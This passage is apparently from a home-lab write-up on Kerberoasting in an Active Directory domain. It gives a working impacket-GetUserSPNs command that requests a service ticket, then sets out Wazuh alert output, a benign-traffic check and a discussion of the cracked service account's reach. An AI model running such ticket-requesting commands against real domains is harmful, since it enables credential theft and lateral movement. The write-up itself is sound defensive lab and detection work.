impacket-GetUserSPNs corp.chakravyuh.local/pnair -dc-ip 192.168.10.10 -request -user svc.sqlreport
```

**Wazuh Alert (Rule 100102):**
```json
{
  "rule": { "id": "100102", "level": 14 },
  "data": {
    "win": {
      "eventdata": {
        "targetUserName": "svc.sqlreport",
        "serviceName": "MSSQLsSvc/SQLPROD01.corp.chakravyuh.local:1433",
        "ticketEncryptionType": "0x17",
        "ipAddress": "::ffff:192.168.10.100"
      }
    }
  }
}
```

**Result:** ✅ **Deception survives hardening** — honey account still detects attackers.

### 8.4 Test 4: Benign Traffic Unaffected
```bash
# On WS-01 (192.168.10.30) as pnair - access SQL share
net use \\SRV-01\Data
```

**Event ID 4769 generated:**
- `TicketEncryptionType = 0x12` (AES256)
- `IpAddress = ::ffff:192.168.10.30` (allowed)
- **No alert** — Rule 100102 correctly suppressed.

---

## 9. What This Actually Means

At this point I hold `svc.sqlsvc`'s real password. In this specific lab, that account's reach is limited to its SQL service role on SRV-01 — but that's exactly the point worth making honestly: the _severity_ of a Kerberoasting result depends entirely on what the compromised service account can actually do. In plenty of real environments, service accounts like this one are quietly over-privileged — local admin on the host they run on, membership in groups nobody's audited in years, access to shares nobody remembers granting. Cracking the ticket is the easy part. What makes it dangerous is what the account was allowed to touch.

And notice what I _didn't_ need at any point in this walkthrough: no exploit, no malware, no elevated starting access. Just an ordinary authenticated domain user and a service account with a tired password.

---

## 10. Next: How Would a SOC Actually Catch This?

Running the attack is half the project. The other half — and the harder, rarer half — is catching it. The detection rules documented here (Wazuh 100100-100102, Sigma `kerberoasting_rc4_4769.yml`) are built from scratch for this exact attack, with proof they fire against the very attack walked through here.
